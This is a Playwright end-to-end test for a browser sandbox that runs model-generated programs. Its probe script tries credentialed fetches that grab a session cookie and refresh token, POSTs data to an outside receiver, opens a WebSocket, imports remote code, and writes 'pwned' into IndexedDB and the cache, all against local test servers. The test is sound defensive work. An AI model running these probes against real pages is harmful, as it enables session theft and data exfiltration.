/* 程序沙箱 (xllm TS TODO MW, 内核架构改进 D21): a wish program of the local executor is model output and runs with
 * less than the page — a classic Worker inside a hidden `sandbox="allow-scripts"` iframe whose CSP has no network
 * source (programHost.ts). It reaches nothing the page holds (cookie, IndexedDB, Cache Storage) and nothing outside:
 * every attempt fails and the receivers count no hit, while the same probes from a same-origin Worker (the executor
 * before the sandbox) reach all of them. A normal program still produces results and files, `aiws.llm.map` answers
 * through the bridge, only the sandbox's own well-formed messages count, and an endless program is killed on timeout
 * or cancel with the page still usable. No Zone: the page and the outside receiver are this spec's own servers; the
 * runner comes from the dev server. */

import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http'
import { expect, test, type Page } from '@playwright/test'

const DEV = `http://127.0.0.1:${process.env.AIWS_E2E_WEB_PORT}`
const HOST_MODULE = `${DEV}/src/app/aiworkspace/executor/programHost.ts`

type Hit = { method: string; path: string; cookie: string }

async function listen(handle: (req: IncomingMessage, res: ServerResponse) => void): Promise<{ server: Server; origin: string; hits: Hit[] }> {
  const hits: Hit[] = []
  const server = createServer((req, res) => {
    hits.push({ method: req.method ?? '', path: (req.url ?? '').split('?')[0], cookie: req.headers.cookie ?? '' })
    handle(req, res)
  })
  server.on('upgrade', (req, socket) => { hits.push({ method: 'WS', path: req.url ?? '', cookie: req.headers.cookie ?? '' }); socket.destroy() })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  return { server, origin: `http://127.0.0.1:${(server.address() as { port: number }).port}`, hits }
}

let site: Awaited<ReturnType<typeof listen>>
let outside: Awaited<ReturnType<typeof listen>>

test.beforeAll(async () => {
  // the page's own origin (the Workspace's): its session cookie, its /sso_refresh
  site = await listen((req, res) => {
    if (req.url === '/') {
      res.setHeader('content-type', 'text/html')
      res.setHeader('set-cookie', 'sid=secret; Path=/')
      res.end('<!doctype html><meta charset="utf-8"><title>sandbox</title><body><button id="still">still usable</button></body>')
    } else if (req.url === '/sso_refresh') {
      res.setHeader('content-type', 'application/json')
      res.end('{"session_token":"stolen"}')
    } else res.end('ok')
  })
  // somewhere outside: accepts anything from anyone
  outside = await listen((_req, res) => {
    res.setHeader('access-control-allow-origin', '*')
    res.setHeader('content-type', 'text/javascript')
    res.end('export default "remote"')
  })
})

test.afterAll(async () => {
  site.server.close()
  outside.server.close()
})

const pageHits = () => site.hits.filter((h) => h.path !== '/' && h.path !== '/favicon.ico')

async function openPage(page: Page) {
  await page.goto(`${site.origin}/`)
  await page.evaluate(async (url) => { (window as unknown as { programHost: unknown }).programHost = await import(url) }, HOST_MODULE)
}

type Outcome = { results: Record<string, unknown> | null; log: string; files: Record<string, unknown> }

/** `runProgram` in the page; `llm.map` requests are answered by `answer(req)` there and recorded. */
async function run(page: Page, source: string, opts: { files?: Record<string, unknown>; timeoutMs?: number; abortAfterMs?: number } = {}): Promise<Outcome & { mapRequests: unknown[]; aborted?: string }> {
  return page.evaluate(async ({ source, files, timeoutMs, abortAfterMs }) => {
    type Host = { runProgram: (s: string, f: unknown, m: (req: unknown) => Promise<unknown>, o: { timeoutMs: number; signal?: AbortSignal }) => Promise<Outcome> }
    const host = (window as unknown as { programHost: Host }).programHost
    const mapRequests: unknown[] = []
    const llmMap = async (req: unknown) => {
      mapRequests.push(req)
      const { items } = req as { items: string[] }
      return { results: items.map((i) => ({ value: i.toUpperCase() })), calls: 1, cached: 0 }
    }
    const abort = new AbortController()
    if (abortAfterMs !== undefined) setTimeout(() => abort.abort(), abortAfterMs)
    try {
      return { ...await host.runProgram(source, files, llmMap, { timeoutMs, signal: abort.signal }), mapRequests }
    } catch (error) {
      return { results: null, log: '', files: {}, mapRequests, aborted: String(error) }
    }
  }, { source, files: opts.files ?? {}, timeoutMs: opts.timeoutMs ?? 30_000, abortAfterMs: opts.abortAfterMs })
}

/** Every way out of the program's realm, each settling to `ok …` or `blocked: <error>` within a few seconds. */
function probes(site: string, outside: string): string {
  return `
const settle = (p) => Promise.race([p.then((v) => 'ok ' + String(v).slice(0, 80), (e) => 'blocked: ' + String(e).slice(0, 200)), new Promise((r) => setTimeout(() => r('blocked: no answer'), 4000))])
const out = {}
out.cookie_fetch = await settle(fetch('${site}/data', { credentials: 'include' }).then((r) => r.text()))
out.sso_refresh = await settle(fetch('${site}/sso_refresh', { method: 'POST', credentials: 'include' }).then((r) => r.text()))
out.external_post = await settle(fetch('${outside}/post', { method: 'POST', body: 'the snapshot' }).then((r) => r.status))
out.websocket = await settle(new Promise((resolve, reject) => { const ws = new WebSocket('${outside.replace('http', 'ws')}/ws'); ws.onopen = () => resolve('open'); ws.onerror = () => reject(new Error('websocket error')); ws.onclose = () => reject(new Error('websocket closed')) }))
out.remote_import = await settle(import('${outside}/remote.js').then((m) => m.default))
out.indexeddb = await settle(new Promise((resolve, reject) => {
  const open = indexedDB.open('aiws-probe')
  open.onerror = () => reject(open.error)
  open.onsuccess = () => { const tx = open.result.transaction('kv', 'readwrite'); tx.objectStore('kv').put('pwned', 'k'); tx.oncomplete = () => resolve('written'); tx.onerror = () => reject(tx.error) }
}))
out.cache = await settle(Promise.resolve().then(() => caches.open('aiws-probe')).then((c) => c.put('${site}/asset.js', new Response('pwned'))).then(() => 'written'))
out.nested_worker = await settle(new Promise((resolve, reject) => {
  const w = new Worker(URL.createObjectURL(new Blob(["fetch('${outside}/nested', { method: 'POST', body: 'x' }).then((r) => postMessage('ok ' + r.status), (e) => postMessage('blocked: ' + e))"], { type: 'text/javascript' })))
  w.onmessage = (e) => (String(e.data).startsWith('ok') ? resolve(e.data) : reject(e.data))
  w.onerror = (e) => { e.preventDefault(); reject(new Error('nested worker: ' + e.message)) }
}))
`
}

test('a program reaches nothing of the page and nothing outside; the same probes from a same-origin Worker reach all of it', async ({ page }) => {
  await openPage(page)
  // what the page holds: its cookie, a database, a cached asset
  await page.evaluate(async (site) => {
    await new Promise<void>((resolve, reject) => {
      const open = indexedDB.open('aiws-probe', 1)
      open.onupgradeneeded = () => open.result.createObjectStore('kv')
      open.onsuccess = () => { const tx = open.result.transaction('kv', 'readwrite'); tx.objectStore('kv').put('page', 'k'); tx.oncomplete = () => { open.result.close(); resolve() }; tx.onerror = () => reject(tx.error) }
      open.onerror = () => reject(open.error)
    })
    await (await caches.open('aiws-probe')).put(`${site}/asset.js`, new Response('page'))
  }, site.origin)
  const held = () => page.evaluate(async (site) => {
    const value = await new Promise((resolve, reject) => {
      const open = indexedDB.open('aiws-probe')
      open.onsuccess = () => { const get = open.result.transaction('kv').objectStore('kv').get('k'); get.onsuccess = () => { open.result.close(); resolve(get.result) }; get.onerror = () => reject(get.error) }
      open.onerror = () => reject(open.error)
    })
    const cached = await (await caches.match(`${site}/asset.js`))?.text()
    return { cookie: document.cookie, indexeddb: value, cache: cached, caches: await caches.keys() }
  }, site.origin)
  expect(await held()).toEqual({ cookie: 'sid=secret', indexeddb: 'page', cache: 'page', caches: ['aiws-probe'] })
  site.hits.length = 0
  outside.hits.length = 0

  const out = await run(page, `export default async function main(aiws) {\n${probes(site.origin, outside.origin)}\naiws.facts({ origin: self.origin, probes: out })\n}`)
  expect(out.results?.error ?? null).toBeNull()
  const facts = (out.results as { facts: { origin: string; probes: Record<string, string> } }).facts
  expect(facts.origin).toBe('null')
  const { cache, ...rest } = facts.probes
  for (const [name, result] of Object.entries(rest)) expect(result, name).toMatch(/^blocked: /)
  // WebKit lets an opaque origin write a Cache Storage of its own, which nobody else sees (checked below and by the next run)
  expect(cache).toMatch(/^(blocked: |ok written)/)
  // a failing fetch says why, in words a model can act on (TW-4)
  expect(facts.probes.external_post).toContain('no network access')
  expect(pageHits()).toEqual([])
  expect(outside.hits).toEqual([])
  expect(await held()).toEqual({ cookie: 'sid=secret', indexeddb: 'page', cache: 'page', caches: ['aiws-probe'] })
  const next = await run(page, `export default async function main(aiws) { let keys; try { keys = await caches.keys() } catch (e) { keys = String(e) } aiws.facts({ caches: keys }) }`)
  expect((next.results as { facts: { caches: unknown } }).facts.caches).not.toContain('aiws-probe')

  // the control: the probes in a same-origin Worker of the page — what the executor's Worker could do before the sandbox
  const control = await page.evaluate(async (code) => {
    const worker = new Worker(URL.createObjectURL(new Blob([`(async () => {\n${code}\npostMessage(out)\n})()`], { type: 'text/javascript' })))
    return new Promise<Record<string, string>>((resolve) => { worker.onmessage = (e) => { worker.terminate(); resolve(e.data) } })
  }, probes(site.origin, outside.origin))
  for (const name of ['cookie_fetch', 'sso_refresh', 'external_post', 'remote_import', 'indexeddb', 'cache', 'nested_worker']) expect(control[name], name).toMatch(/^ok /)
  expect(control.sso_refresh).toContain('stolen')
  expect(pageHits()).toEqual(expect.arrayContaining([
    { method: 'GET', path: '/data', cookie: 'sid=secret' },
    { method: 'POST', path: '/sso_refresh', cookie: 'sid=secret' },
  ]))
  expect(outside.hits.map((h) => `${h.method} ${h.path}`)).toEqual(expect.arrayContaining(['POST /post', 'WS /ws', 'GET /remote.js', 'POST /nested']))
  expect(await held()).toMatchObject({ indexeddb: 'pwned', cache: 'pwned' })
})

const INPUT_FILES = {
  'request.json': { text: JSON.stringify({ today: '2026-11-07' }) },
  'context/inputs.json': { text: JSON.stringify({ data: { entity_id: 'sales', type_id: 'buckyos.table-source', label: 'sales' } }) },
  'context/entities/sales/schema.json': { text: JSON.stringify({ fields: [{ field_id: 'f1', name: 'region', type: 'text' }, { field_id: 'f2', name: 'revenue', type: 'number' }] }) },
  'context/entities/sales/rows.jsonl': { text: ['{"id":"r1","v":{"f1":"east","f2":10}}', '{"id":"r2","v":{"f1":"west","f2":5}}', '{"id":"r3","v":{"f1":"east","f2":7}}'].join('\n') },
  'context/entities/sales/logo.bin': { base64: 'AAEC' },
}

const NORMAL = `export default async function main(aiws) {
  const totals = {}
  for (const r of aiws.input('data').rows()) totals[r.region] = (totals[r.region] ?? 0) + r.revenue
  const rows = Object.entries(totals).map(([region, total]) => ({ region, total }))
  aiws.result.table('by_region', rows, { key: 'region', fields: { region: 'text', total: 'number' } })
  aiws.facts({ total: rows.reduce((s, r) => s + r.total, 0), today: aiws.request.today })
  aiws.check('total', true)
  const labels = await aiws.llm.map(rows.map((r) => r.region), 'upper-case it')
  aiws.result.text('note', 'Regions: ' + labels.join(', '))
  Deno.writeTextFileSync('output/report.md', '# ' + labels.join(' '))
  Deno.writeFileSync('output/copy.bin', Deno.readFileSync('context/entities/sales/logo.bin'))
  console.log('done with', rows.length, 'regions')
}`

test('a normal program produces its results and files, and llm.map answers through the bridge', async ({ page }) => {
  await openPage(page)
  const out = await run(page, NORMAL, { files: INPUT_FILES })
  const results = out.results as { results: { name: string; rows?: unknown[]; markdown?: string }[]; facts: unknown; checks: unknown[]; external: string[]; llm_map: unknown; error: string | null }
  expect(results.error).toBeNull()
  expect(results.results.find((r) => r.name === 'by_region')?.rows).toEqual([{ region: 'east', total: 17 }, { region: 'west', total: 5 }])
  expect(results.results.find((r) => r.name === 'note')?.markdown).toBe('Regions: EAST, WEST')
  expect(results.facts).toEqual({ total: 22, today: '2026-11-07' })
  expect(results.checks).toEqual([{ id: 'total', passed: true, detail: null }])
  expect(results.external).toEqual([])
  expect(results.llm_map).toEqual({ calls: 1, items: 2, cached: 0 })
  expect(out.mapRequests).toEqual([{ items: ['east', 'west'], instruction: 'upper-case it', schema: { type: 'string' }, batch: 20 }])
  expect(out.files).toEqual({ 'output/report.md': '# EAST WEST', 'output/copy.bin': { base64: 'AAEC' } })
  expect(out.log).toContain('done with 2 regions')
  expect(out.log).toContain('table by_region: 2 rows')
  // a program that throws: its error comes back as the run's error, with the message on every engine
  const failed = await run(page, `export default async function main() { throw new Error('bad data') }`)
  expect(String(failed.results?.error)).toContain('Error: bad data')
  // a program that imports from the network does not load, and says why (TW-4)
  outside.hits.length = 0
  const remote = await run(page, `import x from '${outside.origin}/remote.js'\nexport default async function main(aiws) { aiws.facts({ x }) }`)
  expect(String(remote.results?.error)).toContain('cannot import modules')
  expect(outside.hits).toEqual([])
})

test('only the sandbox\'s own well-formed messages count', async ({ page }) => {
  await openPage(page)
  const pending = run(page, `export default async function main(aiws) {
    postMessage({ type: 'done', results: 'not an object', log: '', files: {} })
    postMessage({ type: 'done', results: {}, log: '', files: { 'output/x': { base64: 'AA', more: 1 } } })
    postMessage({ type: 'llm_map', id: 'one', req: {} })
    postMessage({ type: 'something', results: { forged: true } })
    await new Promise((r) => setTimeout(r, 1500))
    aiws.facts({ real: true })
  }`)
  // another window's message to the page is not the sandbox's
  await page.waitForTimeout(500)
  await page.evaluate(() => window.postMessage({ type: 'done', results: { forged: 'page' }, log: '', files: {} }, '*'))
  const out = await pending
  expect((out.results as { facts: unknown }).facts).toEqual({ real: true })
  expect(out.mapRequests).toEqual([])
})

test('an endless program is killed on timeout and on cancel; the page stays usable', async ({ page }) => {
  await openPage(page)
  const workers: { url: string; closed: boolean }[] = []
  page.on('worker', (worker) => {
    const entry = { url: worker.url(), closed: false }
    workers.push(entry)
    worker.on('close', () => { entry.closed = true })
  })
  const endless = `export default async function main() { for (;;) {} }`
  const timedOut = await run(page, endless, { timeoutMs: 2000 })
  expect(timedOut.results).toEqual({ error: 'The program timed out (2 s)' })
  expect(workers.length).toBe(1)
  expect(workers[0].url).toMatch(/^blob:null\//)
  await expect.poll(() => workers[0].closed, { timeout: 10_000 }).toBe(true)
  expect(await page.locator('iframe').count()).toBe(0)

  const cancelled = await run(page, endless, { timeoutMs: 60_000, abortAfterMs: 1000 })
  expect(cancelled.aborted).toContain('AbortError')
  expect(workers.length).toBe(2)
  await expect.poll(() => workers[1].closed, { timeout: 10_000 }).toBe(true)
  expect(await page.locator('iframe').count()).toBe(0)

  await page.locator('#still').click()
  const again = await run(page, NORMAL, { files: INPUT_FILES })
  expect((again.results as { error: string | null }).error).toBeNull()
  await expect.poll(() => page.workers().length, { timeout: 10_000 }).toBe(0)
})
